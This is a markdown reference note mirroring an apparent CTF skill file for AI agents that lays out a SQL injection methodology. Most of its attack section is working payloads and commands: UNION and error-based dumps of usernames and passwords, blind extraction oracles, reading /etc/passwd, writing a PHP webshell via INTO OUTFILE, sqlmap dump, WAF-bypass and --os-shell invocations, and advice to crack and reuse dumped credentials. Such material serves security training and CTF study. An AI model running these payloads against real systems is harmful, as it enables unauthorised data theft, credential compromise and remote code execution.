# SQL Injection

[Оглавление](https://raw.githubusercontent.com/BigBread57/zametki/main/INDEX.md) · [Происхождение и ограничения](https://raw.githubusercontent.com/BigBread57/zametki/main/SOURCES.md)

> Справочный документ. Инструкции и примеры ниже принадлежат источнику; они не подтверждают состояние вашей системы и не запускаются автоматически. Чтение этого файла не устанавливает скил, инструменты или MCP.

Источники этого текста:

- [Salman0x01/ctf-ai-agent-skills / instructions/web/sql-injection.md](https://github.com/Salman0x01/ctf-ai-agent-skills/blob/0e91c90a7125c6591a56f51276275905f2dfb017/instructions/web/sql-injection.md)

---

---
name: sql-injection
category: web
triggers: [sqli, "sql injection", sqlmap, union, "boolean blind", "time-based", "error-based", "syntax error", "You have an error in your SQL syntax", ORA-, "quoted string not properly terminated", "unclosed quotation mark", "?id=", "order by", "sqlite", mysql, postgres, mssql]
tools: [sqlmap, curl, ffuf, hashcat]
priority: high
description: Detect and exploit SQL injection manually and with sqlmap — union, blind boolean/time, error-based, plus WAF bypass.
---
# SQL Injection

## Trigger context
- A parameter reaches a query: `?id=`, `?cat=`, `search=`, `username=`, JSON/`Cookie` fields, `X-Forwarded-For` in logging apps.
- DB errors leak: `You have an error in your SQL syntax` (MySQL), `unclosed quotation mark` (MSSQL), `ORA-00933` (Oracle), `SQLITE_ERROR`, `pg_query()`/`PostgreSQL`.
- Content/behaviour changes on `'`, `"`, `)`, `--`, `#`, or on `AND 1=1` vs `AND 1=2`.
- Login forms, sort/order params (`ORDER BY`), LIMIT/OFFSET, and numeric IDs.

## Objective
Confirm injection, identify DBMS + technique, extract data (users, hashes, flag table), and where possible read files / achieve RCE.

## Methodology (decision tree)
1. Find the injection: submit `'` then `''`, then `)`,`'))`. Break vs fix -> injectable. Note if numeric (no quotes needed) or string.
2. Determine context & DBMS from errors or fingerprint payloads (version, string concat, comment style).
3. Pick technique in this order of ease:
   a. Error-based (if errors reflected).
   b. UNION-based (if query output is displayed).
   c. Boolean-blind (page differs true/false).
   d. Time-based blind (no visible difference — last resort, slow).
4. UNION path: find column count (`ORDER BY n` / `UNION SELECT NULL,...`), find which columns echo, dump schema.
5. Blind path: build a boolean/time oracle and extract char-by-char (or hand to sqlmap).
6. Escalate: read files (`LOAD_FILE`, `pg_read_file`), write webshell (`INTO OUTFILE`), stacked queries -> RCE where supported.
7. Automate with sqlmap once you know the parameter and technique; add tamper scripts if a WAF blocks.

## Commands & payloads
```http
# 1. Detection (string context) — break then repair
?id=1'                       -> error
?id=1' -- -                  -> back to normal (comment rest)
?id=1' AND '1'='1            -> true page
?id=1' AND '1'='2            -> false/empty page
# numeric context
?id=1 AND 1=1  /  ?id=1 AND 1=2
```
```sql
-- 2. DBMS fingerprint
' UNION SELECT @@version-- -            -- MySQL/MSSQL
' UNION SELECT version()-- -            -- PostgreSQL
' AND 1=CAST((SELECT sqlite_version()) AS INT)-- -   -- SQLite (error-based)

-- 4. UNION: column count then reflected columns
' ORDER BY 5-- -                        -- increment until error -> N-1 cols
' UNION SELECT NULL,NULL,NULL-- -        -- match count, find echoed col
' UNION SELECT 1,2,3-- -
-- enumerate (MySQL)
' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database()-- -
' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'-- -
' UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users-- -

-- 1b. Error-based (MySQL, no visible output)
' AND extractvalue(1,concat(0x7e,(SELECT group_concat(username,0x3a,password) FROM users)))-- -
' AND updatexml(1,concat(0x7e,(SELECT version())),1)-- -

-- 3c. Boolean blind oracle
' AND (SELECT SUBSTRING(password,1,1) FROM users LIMIT 1)='a'-- -
' AND (SELECT COUNT(*) FROM users)>0-- -

-- 3d. Time-based blind
' AND IF(1=1,SLEEP(5),0)-- -                         -- MySQL
'; SELECT pg_sleep(5)-- -                             -- PostgreSQL (stacked)
' AND 1=(SELECT 1 FROM (SELECT SLEEP(5))x)-- -        -- subquery variant
'; WAITFOR DELAY '0:0:5'-- -                          -- MSSQL

-- 6. File read / write (MySQL, needs FILE priv / secure_file_priv)
' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3-- -
' UNION SELECT 1,'<?php system($_GET[c]);?>',3 INTO OUTFILE '/var/www/html/sh.php'-- -
```
```bash
# 7. sqlmap — feed a saved Burp request (auto-picks cookies/headers/POST)
sqlmap -r req.txt -p id --batch --level=3 --risk=2 --dbms=mysql
# direct URL, dump the interesting table
sqlmap -u "http://TARGET/page.php?id=1" --batch --dbs
sqlmap -u "http://TARGET/page.php?id=1" -D appdb --tables
sqlmap -u "http://TARGET/page.php?id=1" -D appdb -T users --dump
# force techniques / speed up blind
sqlmap -u "URL" --technique=BEUST --threads=10 --batch
# WAF bypass with tamper scripts
sqlmap -u "URL" --batch --tamper=space2comment,between,randomcase --random-agent
sqlmap -u "URL" --list-tampers   # discover available scripts
# OS shell / file ops where supported
sqlmap -u "URL" --os-shell        # stacked queries + writable webroot
sqlmap -u "URL" --file-read=/etc/passwd
```
```
# Manual WAF bypass tricks
' /*!50000UNION*/ /*!50000SELECT*/ ...        inline comment (MySQL)
'/**/UNION/**/SELECT/**/                       comments for spaces
'%09UNION%0aSELECT                             tabs/newlines for spaces
UnIoN SeLeCt                                   case mixing
'||(SELECT ...)||'                             concat context
0x757365727 -> hex-encode strings to dodge quote filters
```

## Branching logic
- If output echoed on page -> UNION. If only errors echoed -> error-based.
- If page just differs true/false -> boolean blind. If nothing differs -> time-based (confirm with SLEEP).
- If `stacked queries` work (`;`) on MSSQL/PostgreSQL -> try `xp_cmdshell` / `COPY ... PROGRAM` for RCE.
- If FILE priv + known webroot -> `INTO OUTFILE` webshell -> pivot to [command-injection](https://raw.githubusercontent.com/BigBread57/zametki/main/05-web/sa--instructions--web--command-injection.md).
- If creds/hashes dumped -> crack with hashcat, reuse on login/SSH.
- If WAF blocks -> tamper scripts, encoding, or move to manual bespoke bypass.

## Common pitfalls
- Wrong comment terminator: MySQL needs `-- ` (trailing space) or `#`; use `-- -` to be safe. `#` becomes `%23` in URLs.
- UNION column count/type mismatch -> use `NULL`s first, then place strings only in text columns.
- Injecting inside quotes already added by app: match/escape the exact context (`')`, `'))`).
- Time-based on a loaded server: raise delay to 10s and repeat to confirm it's not noise.
- sqlmap false-negative: raise `--level`/`--risk`, supply `--dbms`, or a real request file with `-r`.
- Don't run `--os-shell`/`--dump-all` blindly in a CTF; target the flag table.

## Proof / verification
- Confirm control: `AND 1=1` (normal) vs `AND 1=2` (broken) reliably toggles the page.
- Time-based: response time scales with SLEEP value.
- Capture flag: enumerate tables, look for `flag`, `secret`, `config`; `SELECT flag FROM ...` or dump the db. `grep -riE 'flag\{|CTF\{' sqlmap_output/`.

## Cross-references
[web-recon](https://raw.githubusercontent.com/BigBread57/zametki/main/05-web/sa--instructions--web--web-recon.md) · [command-injection](https://raw.githubusercontent.com/BigBread57/zametki/main/05-web/sa--instructions--web--command-injection.md) · [xss](https://raw.githubusercontent.com/BigBread57/zametki/main/05-web/sa--instructions--web--xss.md)

## Credible sources
- https://portswigger.net/web-security/sql-injection
- https://portswigger.net/web-security/sql-injection/cheat-sheet
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
- https://book.hacktricks.wiki/en/pentesting-web/sql-injection/index.html
- https://github.com/sqlmapproject/sqlmap/wiki/Usage
